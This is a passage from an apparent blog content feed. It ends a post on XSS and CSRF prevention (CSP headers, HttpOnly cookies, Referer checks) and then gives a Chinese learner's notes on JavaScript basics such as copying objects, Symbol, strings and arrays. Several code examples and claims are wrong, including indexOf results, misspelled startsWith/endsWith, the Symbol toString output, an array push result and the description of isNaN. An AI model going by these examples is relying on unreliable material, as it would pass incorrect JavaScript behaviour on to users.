<p>Since not only unicode can be injected, but other types of encoding as well (for similar reasons), we need to try to set the character encoding of the page to one (e.g. unicode: utf-8) so that we can focus on unicode injection.</p>
</li>
</ol>
<h4 id="Some-other-general-prevention-methods"><a href="#Some-other-general-prevention-methods" class="headerlink" title="Some other general prevention methods"></a>Some other general prevention methods</h4><ol>
<li><p>add the <code>Http Header</code> of the <code>Content Security Policy</code> to the output html</p>
<p>What it does: Prevents the page from being embedded in a third-party script file when attacked by XSS</p>
</li>
<li><p>add <code>HttpOnly</code> parameter when setting cookies</p>
<p>Function: To prevent cookie information from being stolen when the page is attacked by XSS</p>
<p>Disadvantage: the website’s own <code>JavaScript</code> code cannot manipulate cookies</p>
</li>
<li><p>check the Referer parameter of the request when developing the API</p>
<p>Effect: It can prevent CSRF attacks to a certain extent</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>JavaScript琐碎基础---学习手记</title>
    <url>/en/2021/09/24/JavaScript%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p><strong>JavaScript语语法基础部分一览，包括面试常见的“深浅拷贝”、数据结构操作（如数组插入等）需熟记于心。</strong></p>
<a id="more"></a>

<h1 id="条件运算符"><a href="#条件运算符" class="headerlink" title="? 条件运算符"></a>? 条件运算符</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> result = condition ? value1 : value2;</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>如果条件为真，则返回<code>value1</code>；否则，返回<code>value2</code></p>
<h1 id="‘-’空值合并"><a href="#‘-’空值合并" class="headerlink" title="‘??’空值合并"></a>‘??’空值合并</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> res = a ?? b;</span><br></pre></td></tr></table></figure>
<ol>
<li>如果a已定义，则结果为a</li>
<li>否则，结果为b</li>
</ol>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">alert(user ?? <span class="string">&quot;Anonymous&quot;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h1><h2 id="Object-assign（浅拷贝）"><a href="#Object-assign（浅拷贝）" class="headerlink" title="Object.assign（浅拷贝）"></a>Object.assign（浅拷贝）</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(target_object, [source_object1, source_object2, source_object3...])</span><br></pre></td></tr></table></figure>
<p><strong>用例</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123; <span class="attr">name</span>:<span class="string">&quot;Will&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> info = &#123;<span class="attr">age</span>: <span class="number">18</span>, <span class="attr">grade</span>: <span class="string">&quot;Master&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> drive = &#123;<span class="attr">canDrive</span>: <span class="literal">true</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.assign(user, info, drive); <span class="comment">// user = &#123;name:&quot;Will&quot;, age: 18, grade: &quot;Master&quot;, canDrive: true&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> new_user = <span class="built_in">Object</span>.assign(&#123;&#125;, user, info, drive); <span class="comment">// 返回一个新的对象</span></span><br></pre></td></tr></table></figure>
<p><strong>使用for loop实现</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  name : <span class="string">&quot;Will&quot;</span>,</span><br><span class="line">  age : <span class="number">18</span>,</span><br><span class="line">  grade: <span class="string">&quot;Master&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> clone = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> user) &#123;</span><br><span class="line">  clone[key] = user[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="深层克隆（深拷贝）"><a href="#深层克隆（深拷贝）" class="headerlink" title="深层克隆（深拷贝）"></a>深层克隆（深拷贝）</h2><p><em><strong>由于上述的对象克隆（无论是for loop还是Object.assign）都是假设所有的属性为原始类型，但是对于对象的引用类型，则会失效。因为它会直接复制其引用，因此双方仍然会共用一个属性值</strong></em></p>
<p><strong>因此，我们需要深层克隆。</strong></p>
<h3 id="Json-parse-JSON-stringify-xxxx-—-通常"><a href="#Json-parse-JSON-stringify-xxxx-—-通常" class="headerlink" title="Json.parse(JSON.stringify(xxxx)) — 通常"></a>Json.parse(JSON.stringify(xxxx)) — 通常</h3><ul>
<li>Pros：简单易用</li>
<li>Cons：<pre><code>1. 会忽略undefined
 2. 会忽略symbol
 3. 不能序列化函数
 4. 不能解决循环引用的问题
</code></pre>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  age : <span class="number">10</span>,</span><br><span class="line">  jobs: &#123;</span><br><span class="line">    first: <span class="string">&quot;police&quot;</span>,</span><br><span class="line">    second: <span class="string">&quot;pilot&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(a));</span><br><span class="line"></span><br><span class="line">a.jobs.first = <span class="string">&quot;programmer&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b.jobs.first); <span class="comment">// police</span></span><br></pre></td></tr></table></figure>
<h3 id="MessageChannel（消息通道）"><a href="#MessageChannel（消息通道）" class="headerlink" title="MessageChannel（消息通道）"></a>MessageChannel（消息通道）</h3><ul>
<li><p>Pros：</p>
<pre><code>1. 能解决undefined
 2. 能解决循环引用
</code></pre>
</li>
<li><p>Cons：异步函数</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    		<span class="keyword">const</span> &#123;port1, port2&#125; = <span class="keyword">new</span> MessageChannel();</span><br><span class="line">    		port2.onmessage = <span class="function">(<span class="params">ev</span>)=&gt;</span>&#123;resolve(ev.data);&#125;</span><br><span class="line">        port1.postMessage(obj);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="comment">//之后再看</span></span><br></pre></td></tr></table></figure>
<h1 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h1><p><em><strong>简言之：JS引擎有一个被称作垃圾回收器的东西在后台自动运行，它监控所有对象的状态，然后删除那些已经不可达的对象（即不能访问到它了）</strong></em></p>
<h1 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p><strong>约定：</strong></p>
<ol>
<li>命名以大写字母开头</li>
<li>只能由new操作符来执行</li>
</ol>
<h1 id="可选链"><a href="#可选链" class="headerlink" title="可选链  ?."></a>可选链  ?.</h1><p><strong>简言之：</strong>如果可选链前面的部分是null或undefined则返回undefined；否则，返回该部分以及后面的访问属性</p>
<p><code>value?.prop</code>:</p>
<p>注：这里的不存在指的是该变量为null和undefined</p>
<ul>
<li>如果value存在，则返回value.prop</li>
<li>如果value不存在（即为null或undefined），则返回undefined，而不会像直接用<code>value.prop</code>一样报错</li>
</ul>
<p><strong>例子：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">user?.address?.name; <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> admin = &#123;<span class="attr">name</span>: <span class="string">&quot;Will&quot;</span>&#125;;</span><br><span class="line">admin?.name; <span class="comment">// &quot;Will&quot;</span></span><br><span class="line">admin?.age; <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p><strong>扩展</strong></p>
<p><code>obj?.prop</code></p>
<p><code>obj?.[prop]</code></p>
<p><code>obj.methodName?.()</code></p>
<p><strong>最后</strong></p>
<p>注意使用<code>?.</code>时，一定要确保其前面的变量<em><strong>已经声明</strong></em>，否则同样会报错</p>
<h1 id="Symbol类型"><a href="#Symbol类型" class="headerlink" title="Symbol类型"></a>Symbol类型</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>“Symbol”表示唯一的标识符，使用Symbol()来创建这种类型的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> uniqueId = <span class="built_in">Symbol</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> uniqueId2 = <span class="built_in">Symbol</span>(<span class="string">&quot;id&quot;</span>); <span class="comment">// &quot;id&quot;为Symbol的一个描述</span></span><br></pre></td></tr></table></figure>
<p><strong>Symbol保证唯一性，即使具有相同描述的Symbol，它们的值也不同</strong></p>
<h3 id="Symbol不会被自动转化为字符串"><a href="#Symbol不会被自动转化为字符串" class="headerlink" title="Symbol不会被自动转化为字符串"></a>Symbol不会被自动转化为字符串</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> uniqueId = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">uniqueId.toString(); <span class="comment">// Symbol(uniqueId)</span></span><br></pre></td></tr></table></figure>
<h2 id="Symbol可以用来创建对象的“隐藏”属性"><a href="#Symbol可以用来创建对象的“隐藏”属性" class="headerlink" title="Symbol可以用来创建对象的“隐藏”属性"></a>Symbol可以用来创建对象的“隐藏”属性</h2><h2 id="可以作为对象的属性键"><a href="#可以作为对象的属性键" class="headerlink" title="可以作为对象的属性键"></a>可以作为对象的属性键</h2><p><strong>注：</strong>在对象字面量{…}中使用Symbol作为属性键时，需要将它用方括号括起来</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">  name: <span class="string">&quot;will&quot;</span>,</span><br><span class="line">  [id]: <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Symbol在for…in循环中会跳出，但Object.assign方法却不会忽略symbol属性键</strong></p>
<h2 id="全局Symbol注册表"><a href="#全局Symbol注册表" class="headerlink" title="全局Symbol注册表"></a>全局Symbol注册表</h2><p><strong>注：</strong>使用<code>Symbol.for(&quot;key&quot;)</code>的方式从全局注册表中读取描述为key的Symbol，如果不存在则创建一个新的Symbol（Symbol(key)），并通过给定的key将其存储在注册表中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> id = <span class="built_in">Symbol</span>.for(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><strong>反向调用</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sym = <span class="built_in">Symbol</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="built_in">Symbol</span>.keyFor(sym); <span class="comment">// id</span></span><br></pre></td></tr></table></figure>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><h3 id="toString-base"><a href="#toString-base" class="headerlink" title="toString(base)"></a>toString(base)</h3><ul>
<li><p>base表示进制，例如base=2，就以二进制的形式进行返回该数的字符串形式</p>
</li>
<li><p>base的范围是2-36，常用的是2、16、36</p>
</li>
<li><p>如果在数字上直接调用该方法，则要使用2个点。如；<code>100..toString(2)</code>，第一个点JS识别为小数点</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">num.toString(<span class="number">2</span>); <span class="comment">// &#x27;10&#x27;</span></span><br><span class="line">num.toString(<span class="number">10</span>); <span class="comment">// &#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="舍入rounding"><a href="#舍入rounding" class="headerlink" title="舍入rounding"></a>舍入rounding</h3><ul>
<li><strong>Math.floor</strong>     向下取整</li>
<li><strong>Math.ceil</strong>        向上取整</li>
<li><strong>Math.round</strong>   四舍五入</li>
<li><strong>Math.trunc</strong>    舍去小数点后</li>
<li><strong>toFixed(n)</strong>       四舍五入保留小数点后n位，返回一个字符串</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">12.36</span>;</span><br><span class="line">num.toFixed(<span class="number">1</span>); <span class="comment">// 12.4</span></span><br></pre></td></tr></table></figure>
<h3 id="不精确计算"><a href="#不精确计算" class="headerlink" title="不精确计算"></a>不精确计算</h3><h4 id="0-1-0-2-0-3"><a href="#0-1-0-2-0-3" class="headerlink" title="0.1 + 0.2 !== 0.3"></a>0.1 + 0.2 !== 0.3</h4><p><strong>原因：</strong>0.1 + 0.2的结果为0.3000…04。这是因为数字以其二进制的形式存储在内存中，即一个1和0的序列，同时在二进制中，可以保证以2为整数次幂能精确存储，因此0.1和0.2在二进制中均为无限二进制，无法被精确存储。</p>
<p><strong>解决方法：</strong>使用<code>toFixed()</code>舍去小数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> sum = <span class="number">0.1</span> + <span class="number">0.2</span>;</span><br><span class="line">sum.toFixed(<span class="number">2</span>); <span class="comment">// &#x27;0.30&#x27;</span></span><br><span class="line">+sum.toFixed(<span class="number">2</span>); <span class="comment">// 0.3</span></span><br></pre></td></tr></table></figure>
<h3 id="isFinite和isNaN"><a href="#isFinite和isNaN" class="headerlink" title="isFinite和isNaN"></a>isFinite和isNaN</h3><ul>
<li>Infinity &amp; -Infinity 表示无穷大</li>
<li>NaN表示<code>Not-A-Number</code></li>
</ul>
<p><strong>isNaN判断一个参数是否为Number</strong>（判断之前先将它们专为数字然后再判断）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isNaN</span>(<span class="string">&quot;str&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="string">&quot;12&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="number">12</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h3 id="parseInt-amp-parseFloat"><a href="#parseInt-amp-parseFloat" class="headerlink" title="parseInt &amp; parseFloat"></a>parseInt &amp; parseFloat</h3><p><em><strong><code>+</code>和<code>Number()</code>可以进行数字转换，但如果其不是数字字符串则会转换失败并返回<code>NaN</code></strong></em></p>
<p>使用parseInt和parseFloat可以解决这个问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;100px&#x27;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;12.555px&#x27;</span>); <span class="comment">// 12.555</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;px1000&#x27;</span>); <span class="comment">//NaN</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;px12.555&#x27;</span>); <span class="comment">//NaN</span></span><br></pre></td></tr></table></figure>
<p><code>parseInt(str, base)</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;0xff&#x27;</span>, <span class="number">16</span>); <span class="comment">// 255</span></span><br></pre></td></tr></table></figure>
<h3 id="内建Math其他函数"><a href="#内建Math其他函数" class="headerlink" title="内建Math其他函数"></a>内建Math其他函数</h3><ul>
<li>Math.random() — 返回一个0-1的随机数（不包括1）</li>
<li>Math.max(a, b, c, …) —- 返回一个最大数</li>
<li>Math.min(a, b, c, …) —- 返回一个最小数</li>
<li>Math.pow(n, power) — 返回n<sup>power</sup></li>
</ul>
<h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>en(n为数字)表示1*10<sup>n</sup></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Twothousand = <span class="number">2e3</span>; <span class="comment">// 2000</span></span><br></pre></td></tr></table></figure>
<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s1 = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> s2 = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> s3 = <span class="string">`s`</span>;</span><br></pre></td></tr></table></figure>
<p>反引号允许</p>
<ol>
<li>使用<code>$&#123;...&#125;</code>将任何表达式嵌入</li>
<li>换行</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> s4 = <span class="string">`s2是<span class="subst">$&#123;s3&#125;</span>。1+2=<span class="subst">$&#123;sum(<span class="number">1</span>,<span class="number">2</span>)&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>
<h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><h3 id="length属性"><a href="#length属性" class="headerlink" title="length属性"></a>length属性</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;William&quot;</span>;</span><br><span class="line">word.length; <span class="comment">// 7</span></span><br></pre></td></tr></table></figure>
<h3 id="获取某一位置的字符"><a href="#获取某一位置的字符" class="headerlink" title="获取某一位置的字符"></a>获取某一位置的字符</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word1 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">word[<span class="number">0</span>]; <span class="comment">// H</span></span><br><span class="line">word.charAt(<span class="number">0</span>); <span class="comment">// H</span></span><br></pre></td></tr></table></figure>
<p><strong>可以使用<code>for ... of</code>遍历字符串</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> alphabet <span class="keyword">of</span> <span class="string">&#x27;Hello&#x27;</span>) &#123;</span><br><span class="line">  alert(alphabet); <span class="comment">// H e l l o</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字符串unmutable"><a href="#字符串unmutable" class="headerlink" title="字符串unmutable"></a>字符串unmutable</h3><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><p>$\textcolor{blue}{toUpperCase(), toLowerCase()}$</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.toUpperCase(); <span class="comment">// HELLO WORLD</span></span><br><span class="line"><span class="string">&#x27;Hello World&#x27;</span>.toLowerCase(); <span class="comment">// hello world</span></span><br></pre></td></tr></table></figure>
<h3 id="查询子字符串"><a href="#查询子字符串" class="headerlink" title="查询子字符串"></a>查询子字符串</h3><p><code>string.indexOf(substr, pos)</code>，substr为要查询的子字符串，pos为从指定位置开始查询</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&#x27;Hello Word!&#x27;</span>;</span><br><span class="line">word.indexOf(<span class="string">&#x27;World&#x27;</span>); <span class="comment">// 6</span></span><br></pre></td></tr></table></figure>
<p>**Others: **</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Hello&quot;</span>.includes(<span class="string">&quot;el&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.startWith(<span class="string">&#x27;He&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>.endWith(<span class="string">&#x27;lo&#x27;</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<h3 id="获取子字符串☑️"><a href="#获取子字符串☑️" class="headerlink" title="获取子字符串☑️"></a>获取子字符串☑️</h3><h4 id="slice-start-end"><a href="#slice-start-end" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.slice(<span class="number">0</span>,<span class="number">3</span>); <span class="comment">// Hel</span></span><br></pre></td></tr></table></figure>
<h4 id="substr-start-length"><a href="#substr-start-length" class="headerlink" title="substr( start[, length )"></a>substr( start[, length )</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> word = <span class="string">&quot;HelloWorld&quot;</span>;</span><br><span class="line">word.substr(<span class="number">1</span>,<span class="number">3</span>); <span class="comment">// ell</span></span><br></pre></td></tr></table></figure>
<h3 id="比较字符串"><a href="#比较字符串" class="headerlink" title="比较字符串"></a>比较字符串</h3><h4 id="小写字母总是大于大写字母"><a href="#小写字母总是大于大写字母" class="headerlink" title="小写字母总是大于大写字母"></a>小写字母总是大于大写字母</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> &gt; <span class="string">&#x27;Z&#x27;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>在JS内部，所有字符串都使用UTF-16编码（即：每个字符都有相应的数字代码）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 122</span></span><br><span class="line"><span class="string">&quot;Zealand&quot;</span>.codePointAt(<span class="number">0</span>); <span class="comment">// 90</span></span><br><span class="line"><span class="built_in">String</span>.fromCodePoint(<span class="number">90</span>); <span class="comment">// Z</span></span><br></pre></td></tr></table></figure>
<h1 id="数组Array"><a href="#数组Array" class="headerlink" title="数组Array"></a>数组Array</h1><ol>
<li><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">let</span> arr2 = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Plum&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits[<span class="number">0</span>]; <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line"></span><br><span class="line">fruits[<span class="number">1</span>] = <span class="string">&quot;Pear&quot;</span>;</span><br><span class="line"></span><br><span class="line">fruits.length; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr3 = [<span class="string">&#x27;Apple&#x27;</span>, &#123;<span class="attr">name</span>:<span class="string">&#x27;Will&#x27;</span>&#125;, <span class="literal">true</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">&#x27;Hello&#x27;</span>);&#125;]; <span class="comment">// 任意类型数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><h2 id="队列Queue和栈Stack"><a href="#队列Queue和栈Stack" class="headerlink" title="队列Queue和栈Stack"></a>队列Queue和栈Stack</h2><ol>
<li><h3 id="队列Queue-—-First-In-First-Out"><a href="#队列Queue-—-First-In-First-Out" class="headerlink" title="队列Queue — First In First Out"></a>队列Queue — First In First Out</h3><blockquote>
<p>push —— 在末端加一个元素</p>
<p>shift —— 取出队首一个元素，并返回该值</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Orange&quot;</span>, <span class="string">&quot;Pear&quot;</span>];</span><br><span class="line"></span><br><span class="line">fruits.push(<span class="string">&quot;Banana&quot;</span>); <span class="comment">// </span></span><br><span class="line">fruits; <span class="comment">// &quot;Apple&quot;, &quot;Orange&quot;, &quot;Banana&quot;</span></span><br><span class="line"></span><br><span class="line">fruits.shift(); <span class="comment">// &quot;Apple&quot;</span></span><br><span class="line">fruits; <span class="comment">// &quot;Orange&quot;, &quot;Banana&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><h3 id="栈Stack-—-Last-In-First-Out"><a href="#栈Stack-—-Last-In-First-Out" class="headerlink" title="栈Stack — Last In First Out"></a>栈Stack — Last In First Out</h3><blockquote>
<p>push</p>
<p>pop —— 从末端取出一个元素，并返回该值</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.pop(); <span class="comment">// &quot;Pear&quot;</span></span><br><span class="line">fruits; <span class="comment">// &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift()"></a>unshift()</h3><p>在数组首端添加元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fruits.unshift(<span class="string">&quot;Banana&quot;</span>);</span><br><span class="line">fruits; <span class="comment">// &quot;Banana&quot;, &quot;Apple&quot;, &quot;Orange&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><h2 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h2><p>数组本质上也是一个对象，<code>arr[0]</code>本质上类似<code>obj[key]</code>，arr是对象，数字是键</p>
</li>
<li><h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p><code>push/pop</code>运行较快，而<code>shift/unshift</code>运行较慢</p>
</li>
<li><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// for loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;arr.length; i++) &#123;</span><br><span class="line">  alert(arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for...of loop</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> element <span class="keyword">of</span> arr) &#123;</span><br><span class="line">  alert(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><h2 id="length-可修改"><a href="#length-可修改" class="headerlink" title="length 可修改"></a>length 可修改</h2></li>
<li><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;Mango&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(arr); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br><span class="line">arr.toString(); <span class="comment">// &#x27;Apple,orange,Mango&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="数组的方法‼️"><a href="#数组的方法‼️" class="headerlink" title="数组的方法‼️"></a>数组的方法‼️</h1></li>
</ol>
<h2 id="splice-start-deleteCount-element1-element2-…-—-in-place"><a href="#splice-start-deleteCount-element1-element2-…-—-in-place" class="headerlink" title="splice( start[, deleteCount, element1, element2, … ) — in-place"></a>splice( start[, deleteCount, element1, element2, … ) — in-place</h2><p><strong>可以实现插入、删除</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;I&quot;</span>, <span class="string">&quot;study&quot;</span>, <span class="string">&quot;JavaScript&quot;</span>, <span class="string">&quot;right&quot;</span>, <span class="string">&quot;now&quot;</span>];</span><br><span class="line">arr.splice(<span class="number">0</span>, <span class="number">3</span>, <span class="string">&quot;Let&#x27;s&quot;</span>, <span class="string">&quot;dance&quot;</span>); <span class="comment">// [&quot;I&quot;, &quot;study&quot;, &quot;JavaScript&quot;];</span></span><br><span class="line">arr; <span class="comment">// [&quot;Let&#x27;s&quot;, &quot;dance&quot;, &quot;right&quot;, &quot;now&quot;]</span></span><br></pre></td></tr></table></figure>
<h2 id="slice-start-end-1"><a href="#slice-start-end-1" class="headerlink" title="slice( start[, end) )"></a>slice( start[, end) )</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> newArr = arr.slice(<span class="number">1</span>,<span class="number">3</span>) <span class="comment">// newArr = [&#x27;e&#x27;, &#x27;l&#x27;]</span></span><br></pre></td></tr></table></figure>
